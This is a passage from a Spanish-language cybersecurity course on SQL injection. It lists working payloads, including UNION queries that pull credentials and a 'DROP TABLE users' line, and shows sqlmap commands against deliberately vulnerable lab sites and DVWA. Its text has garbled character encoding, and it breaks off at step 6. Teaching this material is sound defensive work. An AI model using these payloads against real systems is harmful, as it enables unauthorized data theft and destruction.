**Inyecci√≥n basada en errores:** esta t√©cnica implica insertar entradas da√±inas en la base de datos de un sistema para provocar errores. Estos errores potencialmente pueden brindarle informaci√≥n √∫til.

![SQL 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql2.png?raw=true)

**Inyecci√≥n basada en uni√≥n:** el operador UNION le permite combinar los resultados de una consulta da√±ina y una consulta v√°lida. Esto les permite acceder a datos de otras tablas sin permiso.

![SQL 3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql3.png?raw=true)

**Inyecci√≥n ciega** : en este tipo de ataque, el perpetrador no recibe una respuesta directa del servidor. En cambio, infieren informaci√≥n sobre el comportamiento del sistema para recopilar datos.

![SQL 4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql4.png?raw=true)

**Inyecci√≥n ciega basada en el tiempo** : esta t√©cnica implica agregar intencionalmente retrasos a las consultas para verificar la precisi√≥n de condiciones espec√≠ficas. Al analizar los mensajes de error, puede extraer informaci√≥n valiosa sobre la base de datos, lo que ayuda a una mayor explotaci√≥n, como descubrir nombres de tablas o detalles del sistema, sin generar alarmas ni sospechas.

## **Pruebas manuales de inyecci√≥n SQL**

Profundicemos ahora en las t√©cnicas manuales de prueba de inyecci√≥n SQL examinando de cerca la estructura de la URL. Al hacerlo, podemos identificar vulnerabilidades potenciales y explotarlas con fines de evaluaci√≥n de seguridad.

**Analizando la estructura de la URL**

![SQL 5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql5.png?raw=true)

Durante el proceso de prueba manual de inyecci√≥n SQL, un an√°lisis profundo de la estructura de la URL es esencial para identificar y evaluar vulnerabilidades en las aplicaciones web. Este enfoque implica identificar debilidades en la aplicaci√≥n inyectando intencionalmente c√≥digo SQL malicioso a trav√©s de par√°metros que se encuentran dentro de las URL.

Para analizar la vulnerabilidad de un sitio web a los ataques de inyecci√≥n SQL, es importante identificar cualquier entrada del usuario que se transmita a trav√©s de los par√°metros de la URL. Estos par√°metros pueden servirle potencialmente como puntos de entrada. Una vez que se identifican estos par√°metros, probar su manipulabilidad se vuelve crucial.

Esto implica insertar varias cadenas de prueba, caracteres especiales y secuencias de escape para determinar si la aplicaci√≥n maneja adecuadamente dichas entradas sin generar errores.

![SQL 6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql6.png?raw=true)

Otro paso importante es examinar minuciosamente los mensajes de error que produce la aplicaci√≥n. Estos mensajes pueden exponer inadvertidamente vulnerabilidades internas en el sistema, descubriendo potencialmente debilidades de inyecci√≥n SQL.

Por ejemplo, en la imagen de arriba, puede ver un error generado al manipular el par√°metro **de usuario** en la URL, lo que nos ayuda a identificar la **consulta SQL espec√≠fica**¬† que est√° causando el error. Esto luego podr√≠a usarse para intentar explotar la vulnerabilidad que est√° causando el error o lanzar un ataque de denegaci√≥n de servicio (DoS) en el sitio web enviando demasiadas consultas SQL no v√°lidas.

Para profundizar m√°s en las pruebas de este tipo de URL, puede intentar identificar d√≥nde se inserta la entrada del usuario en la consulta SQL. Puede ser un campo de entrada, una variable en la URL o cualquier forma de entrada del usuario.

Para comenzar, puede utilizar una carga √∫til de SQL b√°sica como esta:' OR '1'='1

Inserte esta carga √∫til en la entrada sospechosa y vea si el mensaje de error de SQL desaparece. Si el mensaje de error desaparece o se produce un comportamiento diferente, podr√≠a ser una se√±al de que el sitio es vulnerable a un ataque de inyecci√≥n SQL. Si la carga √∫til b√°sica no produce resultados significativos, es posible que desee experimentar con cargas √∫tiles de SQL m√°s avanzadas, como la inyecci√≥n SQL ciega basada en UNION o basada en tiempo. Por ejemplo, una carga √∫til basada en UNION que podr√≠as probar es: ' UNION

`SELECT null, username, password FROM users--`

Este tipo de carga √∫til intenta extraer informaci√≥n de la tabla de usuarios. Sin embargo, tenga cuidado al utilizar cargas √∫tiles avanzadas como esta, ya que pueden afectar negativamente al sitio que est√° probando, si no se usan correctamente.

En resumen, analizar la estructura de la URL en las pruebas manuales de inyecci√≥n SQL puede ayudar a identificar vulnerabilidades potenciales y evaluar la capacidad de una aplicaci√≥n para manejar entradas maliciosas, brind√°ndole datos importantes para continuar con su pentest.

## **Campos de formulario y mecanismos de validaci√≥n**

Los campos de formulario en una aplicaci√≥n web sirven como punto de entrada para la entrada del usuario. Puede explotar estos campos mediante inyecciones SQL, donde inyecta c√≥digo SQL da√±ino. Estos campos de formulario se utilizan com√∫nmente para recopilar datos importantes del usuario, como nombres, direcciones de correo electr√≥nico, contrase√±as y m√°s.

La combinaci√≥n de campos de formulario bien dise√±ados con mecanismos de validaci√≥n s√≥lidos puede mitigar eficazmente el riesgo de inyecciones de SQL. Por ejemplo, un campo de correo electr√≥nico debe aceptar estrictamente s√≥lo direcciones de correo electr√≥nico v√°lidas, evitando la inserci√≥n de caracteres especiales que podr√≠an manipular consultas SQL. Este no es siempre el caso y est√° sujeto a abuso.

Probar para ver si el formulario acepta caracteres especiales o entradas no t√≠picas puede indicar la posibilidad de enviar comandos o solicitudes maliciosos a la base de datos.

![SQL 7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql7.png?raw=true)

Cuando se prueban manualmente las vulnerabilidades de inyecci√≥n SQL, las medidas de seguridad existentes, como la validaci√≥n de las entradas del usuario, a veces pueden impedir el proceso de inyecci√≥n. En tales casos, vale la pena explorar cargas √∫tiles b√°sicas, como insertar **'OR 1=1--** en el campo de entrada; Este tipo de cargas √∫tiles se denominan cargas √∫tiles de omisi√≥n porque utilizan una condici√≥n que siempre es verdadera para manipular una entrada vulnerable y omitir la autenticaci√≥n, acceder a datos no autorizados o ejecutar comandos maliciosos.

![SQL 8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql8.png?raw=true)

Si bien la validaci√≥n de entradas es una salvaguarda importante, no siempre es infalible, por lo que para identificar posibles vulnerabilidades es esencial realizar pruebas completas y exhaustivas.

## **Valores de cookies y encabezados HTTP**

En las pruebas de inyecci√≥n SQL manuales, puede manipular las solicitudes explotando los valores de las cookies y los encabezados HTTP de una aplicaci√≥n web. Estos elementos se consideran entradas externas, por lo que es importante que realice pruebas adecuadas con las herramientas correctas (como Burp Suite).

Las cookies, que contienen informaci√≥n almacenada en el navegador de un usuario, pueden ser vulnerables a la manipulaci√≥n. Un m√©todo com√∫n es inyectar c√≥digo SQL da√±ino alterando los datos dentro de una cookie. Si se utiliza una cookie, por ejemplo, para almacenar una identificaci√≥n de usuario en una aplicaci√≥n, puede intentar modificar esa identificaci√≥n dentro de la propia cookie. Este tipo de explotaci√≥n podr√≠a dar lugar a un acceso no autorizado a datos o funciones sensibles.

<aside>
üí° Por ejemplo, considere una aplicaci√≥n que utiliza una cookie para controlar al usuario que ha iniciado sesi√≥n actualmente. Ahora, supongamos que un hacker con intenciones maliciosas logra alterar esta cookie alterando el ID de usuario que contiene.

</aside>

Si la aplicaci√≥n no aborda adecuadamente esta modificaci√≥n, podr√≠a generar involuntariamente una consulta SQL da√±ina basada en el ID manipulado. Esto podr√≠a potencialmente otorgar acceso no autorizado a datos confidenciales.

Adem√°s, cuando un navegador env√≠a una solicitud a una aplicaci√≥n, incluye encabezados HTTP como User-Agents. Usted (el atacante) puede alterar estos encabezados insertando cadenas da√±inas en las solicitudes. Por ejemplo, podr√≠a utilizar la siguiente carga √∫til:'UNION SELECT null, username, password FROM users--

Esta carga √∫til est√° dise√±ada para extraer datos de la tabla de "usuarios" de una base de datos. Supongamos que tiene una solicitud HTTP GET que incluye un par√°metro "cat" en el que colocar la carga √∫til. En la pesta√±a "Solicitud HTTP" de Burp Suite, cambie el par√°metro "cat" para que contenga la carga √∫til, por ejemplo:cat=' UNION SELECT null, username, password FROM users--

Comience a enviar la solicitud y observe la respuesta. Si el sitio es vulnerable a una inyecci√≥n SQL basada en UNION, obtendr√° una respuesta que incluye informaci√≥n de la tabla "usuarios".

![SQL 9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql9.png?raw=true)

En ambos casos, es esencial garantizar que la aplicaci√≥n maneje de forma segura los valores de las cookies y los encabezados HTTP. Las pruebas manuales implican analizar el impacto de dichas manipulaciones en las entradas de la aplicaci√≥n y verificar su respuesta a posibles ataques de inyecci√≥n SQL.

**Entrada controlada por el usuario (UCI) procesada por la aplicaci√≥n**

Cuando se prueban manualmente las vulnerabilidades de inyecci√≥n SQL, el concepto de "Entrada controlada por el usuario" o UCI se refiere a cualquier entrada proporcionada por el usuario y posteriormente procesada por la aplicaci√≥n. Esto puede incluir datos ingresados ‚Äã‚Äãen campos de formulario, valores de cookies, par√°metros en URLs o encabezados HTTP (que ya vimos antes), puedes aprovechar estas oportunidades para inyectar c√≥digo SQL malicioso y causar grandes da√±os.

En este enfoque, manipula intencionalmente la entrada proporcionada para insertar caracteres especiales o secuencias de escape (como ‚Äò‚Äô o =). Estas manipulaciones pueden alterar las consultas SQL generadas por la aplicaci√≥n y explotar vulnerabilidades en su procesamiento de entrada. El objetivo es enga√±ar a la aplicaci√≥n para que ejecute consultas SQL no deseadas, lo que resulta en una extracci√≥n de datos no autorizada o en un compromiso del sistema.

### **Debe tener una lista de cargas √∫tiles de inyecci√≥n SQL**

Las cargas √∫tiles son fragmentos de c√≥digo que se insertan intencionalmente en los campos de entrada de las aplicaciones web. Estos fragmentos tienen como objetivo explotar las vulnerabilidades en los sistemas de gesti√≥n de bases de datos. Los profesionales de la seguridad y los evaluadores de penetraci√≥n suelen utilizar estas herramientas para evaluar el nivel de resistencia que tiene una aplicaci√≥n contra posibles ataques. A continuaci√≥n, se muestra una lista de las cargas √∫tiles de

inyecci√≥n SQL m√°s comunes utilizadas por **Pentesters**¬† y **Bug Bounty Hunters**¬† (en un contexto de pirater√≠a √©tica) para probar manualmente formularios en busca de vulnerabilidades de inyecci√≥n SQL:

- payload de inyecci√≥n SQL b√°sica: **' OR '1'='1** (se utiliza para omitir la autenticaci√≥n ingresando una condici√≥n que siempre es verdadera).
- Recuperar informaci√≥n: **' UNION SELECT null,username,password FROM users--** (Se utiliza para extraer datos confidenciales como nombre de usuario y contrase√±a de la base de datos).
- Manipulaci√≥n de consultas: **'; DROP TABLE users; --** (Se utiliza para provocar la eliminaci√≥n de la tabla "usuarios").
- Obtener los nombres de las tablas: **' AND 1=0 UNION SELECT table_name, null FROM information_schema.tables--** (Se utiliza para extraer los nombres de las tablas en la base de datos).
- Extraer nombre de la base de datos: **' AND 1=0 UNION SELECT null, database()--** (Se utiliza para extraer el nombre de la base de datos actual).
- Uso de UNION para extraer datos: **' UNION SELECT username, password FROM users--** (Se utiliza para extraer datos confidenciales mediante una operaci√≥n UNION).
- Uso de comentarios para omitir: **admin' --** (Utiliza un comentario para omitir el resto de la entrada e iniciar sesi√≥n como administrador).
- Uso de SQLi ciego basado en tiempo: **' OR IF(1=1, SLEEP(5), 0)--** (Retrasa la respuesta del servidor para confirmar la vulnerabilidad de inyecci√≥n SQL).
- Uso de SQLi basado en errores: **' AND 1=CONVERT(int, (SELECT @@version))--** (fuerza un error de SQL a revelar informaci√≥n de la base de datos).

Todas estas cargas √∫tiles se pueden usar (y son las m√°s efectivas) en **formularios de inicio de sesi√≥n** vulnerables , **URL** (usadas como consultas maliciosas) y **solicitudes** (capturadas y modificadas por usted con la carga √∫til correcta).

### **Pruebas automatizadas de inyecci√≥n de SQL**

Cuando se trata de seguridad de la informaci√≥n, herramientas como SQLmap y Burp Suite gozan de gran prestigio en el campo de las pruebas de inyecci√≥n SQL.

### **Descripci√≥n general de las herramientas: SQLmap y Burp Suite**

Estas herramientas son ampliamente utilizadas por los profesionales de la seguridad y brindan soluciones automatizadas efectivas para detectar y explotar vulnerabilidades de inyecci√≥n SQL en aplicaciones web. Si bien SQLmap se especializa en pruebas y automatizaci√≥n avanzadas, Burp Suite ofrece un ecosistema completo para analizar la seguridad de las aplicaciones. Permite a los expertos identificar, evaluar y abordar vulnerabilidades cr√≠ticas, incluidas aquellas relacionadas con ataques de inyecci√≥n SQL.

Ahora veamos en detalle para qu√© sirven estas herramientas y para qu√© se utilizan:

- **SQLmap** : es una valiosa herramienta de c√≥digo abierto que automatiza las pruebas de inyecci√≥n de SQL. Detecta vulnerabilidades de forma eficaz, extrae datos y compromete los sistemas de bases de datos utilizando una variedad de cargas √∫tiles y t√©cnicas. Los probadores de penetraci√≥n dependen principalmente de SQLmap para evaluar la seguridad de las aplicaciones.

![SQL 10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql10.png?raw=true)

- **Burp Suite** : es un conjunto completo de herramientas dise√±adas para la seguridad de aplicaciones web. Entre sus caracter√≠sticas, la herramienta incluye un m√≥dulo de Seguridad de Aplicaciones Web (WAS), que ayuda a los especialistas en seguridad a identificar y abordar vulnerabilidades en sitios web. Este m√≥dulo puede detectar amenazas de seguridad comunes que incluyen, como es de esperar, ataques de inyecci√≥n SQL.

![SQL 11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql11.png?raw=true)

### **Ejecuci√≥n de SQLmap para buscar y explotar inyecciones de SQL**

Ahora, usemos SQLmap para descubrir sistem√°ticamente vulnerabilidades de inyecci√≥n SQL en un sitio web deliberadamente vulnerable. Nuestro objetivo ser√° VulnWeb ( http://testphp.vulnweb.com ), un sitio web dise√±ado espec√≠ficamente para que los estudiantes de Seguridad Cibern√©tica aprendan atacando y explotando sus vulnerabilidades.

Si encuentra una URL web como, en este caso, [http://testphp.vulnweb.com/listproducts.php](http://testphp.vulnweb.com/listproducts.php)? **cat=1** , donde el par√°metro 'GET' est√° resaltado, podr√≠a indicar que el sitio web es susceptible a ataques de inyecci√≥n SQL. En tales casos, es posible que pueda acceder a informaci√≥n confidencial de la base de datos. Se sabe que SQLmap es el m√°s eficaz en escenarios que involucran sitios web basados ‚Äã‚Äãen PHP.

![SQL 12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql12.png?raw=true)

**Paso 1: Evaluaci√≥n del par√°metro de la URL**

Una forma sencilla de determinar si su sitio web es vulnerable es reemplazar el valor en el par√°metro de solicitud de obtenci√≥n con un *****¬† (asterisco).

![SQL 13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql13.png?raw=true)

Este tipo de error sugiere que el sitio web es vulnerable a alg√∫n tipo de ataques de inyecci√≥n SQL.

**Paso 2: comprobar la URL con SQLmap**

Necesitamos ingresar la URL web deseada que debe verificarse, usando el par√°metro -u . Generalmente el objetivo principal es determinar si es posible acceder a una base de datos, por lo que podemos utilizar la opci√≥n --dbs¬† para este prop√≥sito. Al utilizar --dbs, podemos obtener una lista de todas las bases de datos disponibles.

El primer comando ser√°:

`sqlmap -u [http://testphp.vulnweb.com/listproducts.php?cat=1](http://testphp.vulnweb.com/listproducts.php?cat=1) --dbs`

![SQL 14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql14.png?raw=true)

**Paso 3: comprender el resultado**

En el resultado anterior, puede ver en amarillo las partes donde SQLmap encontr√≥ vulnerabilidades de inyecci√≥n SQL y en naranja las mejores cargas √∫tiles, sugeridas por SQLmap, para usar ese tipo espec√≠fico de inyecci√≥n SQL (por ejemplo, la primera vulnerabilidad encontrada es una vulnerabilidad booleana). **Inyecci√≥n SQL ciega** basada y la carga √∫til sugerida es: cat-1 AND 1050-1050). Tomemos, por ejemplo, la √∫ltima parte del resultado, resaltada en amarillo, que dice: ‚ÄúEl par√°metro GET **'cat'** es ' **Consulta UNION gen√©rica** '.

Esta parte del resultado nos dice que el par√°metro "cat" de una solicitud GET (que es el tipo de solicitud web que, en este caso, SQLmap est√° usando para probar la URL) dentro de "[http://testphp.vulnweb.com](http://testphp.vulnweb.com/) /listaproductos.php? **cat** =1‚Äù es vulnerable a una consulta UNION gen√©rica.

**Pero ¬øqu√© es una consulta UNION Gen√©rica?**

Es un ataque que normalmente implica manipular la consulta SQL para combinar los resultados de 2 o m√°s tablas de bases de datos, lo que le permite obtener acceso no autorizado a datos confidenciales. En resumen, este resultado de SQLmap sugiere que se necesitan m√°s pruebas para confirmar si el par√°metro **'cat'** es realmente vulnerable a un ataque de inyecci√≥n SQL de "consulta UNION gen√©rica". Es una se√±al para investigar y potencialmente explotar una vulnerabilidad en la validaci√≥n de entrada de la aplicaci√≥n (que es la parte de la aplicaci√≥n web que verifica y permite la entrada del usuario seg√∫n la consulta utilizada).

Y es por eso que podemos ver, en el √∫ltimo resultado resaltado en naranja, que SQLmap sugiere una carga √∫til espec√≠fica, para probar manualmente el sitio web vulnerable para ese tipo de ataque de inyecci√≥n SQL.

## **An√°lisis de mensajes de error**

Durante el proceso de an√°lisis de errores en las pruebas de inyecci√≥n SQL, los errores generados por una aplicaci√≥n pueden ofrecer informaci√≥n importante sobre la existencia de vulnerabilidades. Por ejemplo, los mensajes de error que contienen informaci√≥n confidencial como nombres de tablas, errores flagrantes de sintaxis SQL en los comentarios de la aplicaci√≥n y respuestas inconsistentes, como resultados faltantes o duplicados, pueden indicar una posible manipulaci√≥n de la consulta.

![SQL 15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql15.png?raw=true)

Estos mensajes de error pueden ofrecer informaci√≥n valiosa sobre el funcionamiento interno del sistema. Para activar estos mensajes, se pueden ingresar intencionalmente datos maliciosos que provoquen que las consultas fallen. En la imagen de arriba, puede ver un error de sintaxis SQL (que ya mencionamos antes) que aparece despu√©s de cambiar el valor del par√°metro **cat de " 1** " a ***** (ejemplo de entrada maliciosa).

Si encuentra errores de sintaxis SQL, como el com√∫nmente visto "Tiene un error en su sintaxis SQL" (que podemos ver en la imagen), generalmente significa que la entrada se incluye directamente en las consultas sin la verificaci√≥n adecuada. Este tipo de errores a menudo indican un comportamiento interno del sistema y ayudan a los expertos en seguridad a identificar posibles debilidades en las aplicaciones.

## **Preguntas frecuentes**

- **¬øEs ilegal realizar pruebas de inyecciones de SQL?**

La legalidad de cualquier Pentest depende √∫nicamente de las leyes locales y federales de su pa√≠s, por lo que es una buena pr√°ctica estar informado sobre ellas antes de realizar cualquier tipo de prueba activa. Sin embargo, no deber√≠a haber ning√∫n problema siempre que la actividad se realice de manera responsable y en plataformas donde se haya obtenido el **permiso por escrito**¬† del propietario.

- **¬øQu√© son las t√©cnicas de inyecci√≥n SQL?**

Existen varias t√©cnicas que se pueden utilizar para manipular consultas, como ataques UNION, ataques basados ‚Äã‚Äãen tiempo y ataques basados ‚Äã‚Äãen errores. Estas t√©cnicas implican el uso de datos maliciosos para explotar vulnerabilidades.

- **¬øCu√°l es la mejor herramienta de inyecci√≥n SQL?**

Para fines de automatizaci√≥n, SQLmap se utiliza ampliamente, mientras que Burp Suite ofrece una soluci√≥n vers√°til para an√°lisis de seguridad.

- **¬øNecesito aprender SQL para inyecciones de SQL?**

Tener algunos conocimientos de SQL puede resultar √∫til, pero tambi√©n hay herramientas disponibles que pueden simplificar el proceso de identificaci√≥n de vulnerabilidades.

## **Inyecci√≥n SQL ciega**

La inyecci√≥n ciega de SQL, una forma sigilosa y astuta de ataque de inyecci√≥n de SQL, plantea un desaf√≠o √∫nico para los profesionales de la seguridad debido a su naturaleza esquiva y su dificultad de detecci√≥n y explotaci√≥n. En este completo art√≠culo, profundizaremos en el mundo de la inyecci√≥n SQL ciega y descubriremos los matices sutiles que la distinguen de otros ataques de inyecci√≥n SQL.

A lo largo del art√≠culo, analizaremos varias herramientas y m√©todos, centr√°ndonos en Kali Linux como nuestra plataforma preferida, aunque puede utilizar las herramientas mencionadas en la mayor√≠a de los sistemas operativos. A medida que concluimos, le brindaremos un conjunto de mejores pr√°cticas probadas para defender sus aplicaciones web contra estos ataques esquivos y potencialmente da√±inos. Al final de este art√≠culo, estar√° bien versado en c√≥mo comprender, explotar y defenderse contra las vulnerabilidades de inyecci√≥n SQL ciega.

Ahora, profundicemos en esta gu√≠a detallada y prep√°rese con los conocimientos y t√©cnicas esenciales para abordar de manera efectiva los desaf√≠os que plantea este tipo de vulnerabilidad.

### **¬øQu√© es la inyecci√≥n SQL ciega?**

La inyecci√≥n SQL es una vulnerabilidad frecuente de las aplicaciones web que ocurre cuando un atacante logra ejecutar **c√≥digo SQL** no autorizado en la base de datos de una aplicaci√≥n web. Los atacantes hacen esto insertando declaraciones SQL maliciosas en los campos de entrada del usuario, como cuadros de b√∫squeda o formularios de inicio de sesi√≥n. Cuando tiene √©xito, un atacante puede obtener informaci√≥n confidencial de la base de datos, modificar o eliminar datos e incluso ejecutar comandos administrativos.

La inyecci√≥n ciega de SQL, una variante m√°s oculta, ocurre cuando el atacante **no puede ver directamente el resultado** de sus consultas inyectadas. En este caso, deben deducir los resultados indirectamente utilizando t√©cnicas basadas en contenido o en tiempo. Este tipo de ataque se utiliza cuando la aplicaci√≥n no muestra visiblemente los resultados de una consulta SQL inyectada, lo que dificulta que el atacante confirme el √©xito de sus acciones.

El beneficio de utilizar la inyecci√≥n SQL ciega sobre un ataque de inyecci√≥n SQL est√°ndar radica en su sutileza. Dado que el atacante no ve directamente el resultado, puede resultar m√°s dif√≠cil para los sistemas de seguridad o los administradores detectar el ataque. El atacante suele utilizar respuestas condicionales ( **basadas en booleanos** ) o retrasos en el tiempo de respuesta de la aplicaci√≥n ( **basadas en tiempos** ) para inferir si el c√≥digo SQL inyectado ha tenido el efecto deseado.

Al recopilar lenta y met√≥dicamente informaci√≥n sobre la estructura y el contenido de la base de datos, un atacante a√∫n puede explotar una vulnerabilidad de inyecci√≥n SQL ciega para acceder a datos confidenciales y manipular el sistema sin levantar sospechas inmediatas.

## **Descargo de responsabilidad**

Queremos ser absolutamente claros sobre la importancia de cumplir con las leyes aplicables con respecto al escaneo y la explotaci√≥n de vulnerabilidades de aplicaciones web. Antes de realizar cualquier forma de pirater√≠a √©tica o prueba de penetraci√≥n en un sistema, **aseg√∫rese de haber obtenido el permiso expl√≠cito** del sistema o del propietario de la red.

La pirater√≠a o el escaneo no autorizados pueden parecer triviales, pero pueden acarrear graves consecuencias legales, incluidas multas o prisi√≥n, seg√∫n su jurisdicci√≥n. **No lo hagas.** Algunas de las leyes que rigen esta actividad incluyen:

- La Ley de Abuso y Fraude Inform√°tico (Estados Unidos)
- Secciones 184, 342.1, 380 y 430 del C√≥digo Penal de Canad√° (Canad√°)
- Ley de uso indebido de computadoras de 1990 (Inglaterra)
- Segundo. 202a y 202b del C√≥digo Penal alem√°n (Alemania)
- Ley de Tecnolog√≠a de la Informaci√≥n Sec. 43 y 66 (India)
- Ley sobre la prohibici√≥n del acceso no autorizado a ordenadores (Jap√≥n)

 Si duda si est√° actuando con claridad, consulte el acuerdo o el alcance de sus actividades autorizadas con una entidad espec√≠fica o revise el c√≥digo de conducta o las pautas de divulgaci√≥n con cualquiera de los programas de recompensas por errores mencionados al final de este art√≠culo.

## **Descubriendo y explotando SQLi ciego**

Ahora que tiene un conocimiento s√≥lido de la inyecci√≥n SQL ciega y en qu√© se diferencia de la inyecci√≥n SQL normal, profundicemos en el **proceso de descubrir** y explotar estas vulnerabilidades.¬† Primero, lo guiaremos en la configuraci√≥n de su entorno de laboratorio, luego realizaremos pruebas manuales de inyecci√≥n ciega de SQL y, finalmente, usaremos herramientas como SQLMap y Burp Suite para agilizar el proceso de explotaci√≥n.

### **Configurando su laboratorio**

Para comenzar, deber√° configurar su laboratorio para descubrir y explotar vulnerabilidades de inyecci√≥n SQL ciega. Hay **varias herramientas que puede utilizar** y usaremos las siguientes herramientas y recursos:

**Maldita aplicaci√≥n web vulnerable (DVWA):** DVWA es una aplicaci√≥n web intencionalmente vulnerable que proporciona un entorno seguro para practicar diversas t√©cnicas. **Viene preinstalado en Kali Linux** o puedes descargarlo con sudo apt install dvwa. Una vez instalado, establezca el nivel de dificultad en "bajo" o "medio" y navegue hasta el desaf√≠o "Inyecci√≥n SQL (ciega)". Usaremos esto para simular un escenario del mundo real y demostrar m√©todos de prueba. Para iniciar la aplicaci√≥n DVWA:

1. Abra la terminal y escriba el comando: dvwa-start.
2. Si no est√° en la cuenta ra√≠z, se le pedir√° que lo permita.
3. El navegador deber√≠a abrirse autom√°ticamente en DVWA.
4. (Alternativamente) Si no se abre, vaya al navegador e ingrese: **[http://127.0.0.1:42001](http://127.0.0.1:42001/)**en la barra de direcciones.
5. Para detener el servidor DVWA, regrese a la terminal y escriba el comando: dvwa-stop.

**SQLMap:** esta poderosa herramienta de c√≥digo abierto automatiza la detecci√≥n y explotaci√≥n de vulnerabilidades de inyecci√≥n SQL. **Viene preinstalado en Kali Linux** , por lo que si ese es el sistema operativo que est√°s usando, no necesitas descargarlo por separado. Usaremos SQLMap para automatizar la explotaci√≥n de la vulnerabilidad de inyecci√≥n SQL ciega descubierta en DVWA.

**Burp Suite:** Burp Suite es un conjunto de herramientas de prueba de seguridad de aplicaciones web ampliamente utilizado. Para este art√≠culo, usaremos la Community Edition, **que viene preinstalada en Kali Linux** . Esto se utilizar√° para interceptar las solicitudes realizadas a la DVWA. Demostraremos un m√©todo alternativo de prueba con SQLMap capturando una solicitud con Burp, guard√°ndola como un archivo de texto y luego ejecut√°ndola a trav√©s de SQLMap. Se recomienda que s√≥lo ejecute DVWA u otras aplicaciones intencionalmente vulnerables en un entorno virtual.

## **Pruebas de inyecci√≥n SQL ciega**

La detecci√≥n de una inyecci√≥n SQL ciega implica enviar consultas que producen respuestas condicionales o retrasan el tiempo de respuesta del servidor. Lo guiaremos a trav√©s de cada paso del proceso para que pueda realizar pruebas exhaustivas de inyecci√≥n SQL ciega y comprender el razonamiento o el comportamiento detr√°s de cada acci√≥n. Como nota, la estructura de consulta exacta o los comandos pueden variar seg√∫n la base de datos utilizada. Se demuestra MySQL.

**Paso 1: respuesta normal**

Comience enviando una respuesta normal, como ingresar '2', para ver c√≥mo se comporta la aplicaci√≥n en circunstancias normales. Esto ayuda a establecer una base para el comportamiento esperado sin necesidad de inyectar c√≥digo SQL.

![SQL 16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql16.png?raw=true)

**Paso 2: prueba sencilla**

Realice una prueba sencilla ingresando una comilla simple ( 2‚Äò#) despu√©s del '2' para verificar si esto podr√≠a indicar una vulnerabilidad potencial en la aplicaci√≥n web. Si se produce un error o el comportamiento cambia, podr√≠a sugerir que la aplicaci√≥n est√° manejando incorrectamente la entrada del usuario y puede ser susceptible a la inyecci√≥n SQL. Este ( ‚Äò) no es obligatorio en todos los casos y puede variar seg√∫n la base de datos en la que est√© probando.

NOTA: Al realizar pruebas dentro de un campo de formulario, debe colocar un #al final de su consulta para comentar cualquier texto que el programa pueda agregar posteriormente.

![SQL 17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql17.png?raw=true)

**Paso 3: prueba de verdadero/falso**

Realice las pruebas de verdadero/falso inyectando condiciones " " 2‚Äô AND 1=1#(siempre verdadera) y " 2‚Äô AND 1=0#" (siempre falsa) y observe las respuestas de la aplicaci√≥n a ambas consultas. Si el comportamiento de la aplicaci√≥n cambia seg√∫n la veracidad de la condici√≥n inyectada, indica que el c√≥digo SQL se est√° ejecutando, confirmando la presencia de una vulnerabilidad.

En un ataque de inyecci√≥n SQL normal, esta condici√≥n verdadera podr√≠a devolver informaci√≥n adicional de una tabla, pero ese no es el caso en un ataque ciego. Nuevamente, est√°s buscando cambios en la respuesta.

![SQL 18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql18.png?raw=true)

*El resultado de 1=1, una condici√≥n intencionalmente verdadera.*

![SQL 19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql19.png?raw=true)

*El resultado de 1=0, una condici√≥n intencionalmente falsa.*

**Paso 4: prueba basada en el tiempo**

Pruebe el m√©todo basado en tiempos introduciendo " 2‚Äô AND SLEEP(5)#" en la consulta. Compare el tiempo de respuesta con y sin el comando de suspensi√≥n. Un retraso notable indica una vulnerabilidad potencial, ya que demuestra que la aplicaci√≥n est√° ejecutando el comando SQL inyectado y esperando el tiempo especificado antes de devolver una respuesta.

![SQL 20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql20.png?raw=true)

> *Ejecutar el ataque basado en el tiempo.*

![SQL 21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql21.png?raw=true)

> *Ataque basado en tiempo completo.*

**Paso 5: determinar las columnas**

Determine la cantidad de columnas en la base de datos usando la 2‚Äô ORDER BY X#condici√≥n " ", donde X es la cantidad de columnas que estamos probando. Incremente el n√∫mero hasta que cambie el comportamiento de la aplicaci√≥n, lo que significa que ha encontrado la longitud correcta. Este paso es esencial para comprender la estructura de la base de datos, lo que puede resultar √∫til a la hora de explotar la vulnerabilidad.

![SQL 22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql22.png?raw=true)

> *Prueba manual para una longitud de columna de 1.*

![SQL 23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql23.png?raw=true)

> *Prueba manual para una longitud de columna de 2.*

<aside>
üëâ En nuestro caso, la aplicaci√≥n web arroj√≥ un error cuando probamos una longitud de columna de 3. Este cambio en el comportamiento nos permite saber que hemos identificado que el n√∫mero correcto de columnas es 2, ya que esa fue la √∫ltima prueba exitosa antes del cambio. . Esto se aprende observando el cambio en respuesta.

</aside>

**Paso 6: Determinar la longitud de DB**

